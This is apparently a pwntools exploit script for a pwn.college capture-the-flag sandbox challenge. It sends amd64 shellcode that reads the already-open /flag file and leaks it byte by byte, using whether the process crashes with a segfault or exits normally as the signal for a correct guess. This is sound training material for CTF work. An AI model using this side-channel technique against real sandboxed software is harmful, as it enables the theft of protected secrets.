#!/bin/python

import os
import sys
import time
from pwn import * 

context.log_level = 'error'
context.arch = 'amd64'

FLAG_LEN = 58 
WRITABLE_MEM = 0x1337000 + 0x100
FLAG_MEM = WRITABLE_MEM  + 0x700


flag = bytearray(FLAG_LEN)
argv = None
if len(sys.argv) > 2:
    argv = ['sudo', 'strace', sys.argv[1], '/flag']
else:
    argv = [sys.argv[1], '/flag']

start = 30#len('pwn.college')
for i in range(start, FLAG_LEN):
    for byte in range(32, 256):
        proc = process(argv)

        sc_bytes = (shellcraft.read(3, FLAG_MEM, FLAG_LEN)
                  +
                    f'''
                        mov rdi, {WRITABLE_MEM}
                        mov rax, {FLAG_MEM+i}
                        mov al, [rax]
                        
                        cmp al, {byte}
                        je SEGF

                        mov rax, 0x23
                        syscall

                      SEGF:
                        mov rdi, [0]
                     '''
        )
        proc.send(asm(sc_bytes, arch='amd64'))
        rc = proc.poll(block=True)
        if rc != -31:
            flag[i] = byte
            print(flag[start:i+1])
            print(f"[{i}] = {byte}/{chr(byte)}")


print(flag)
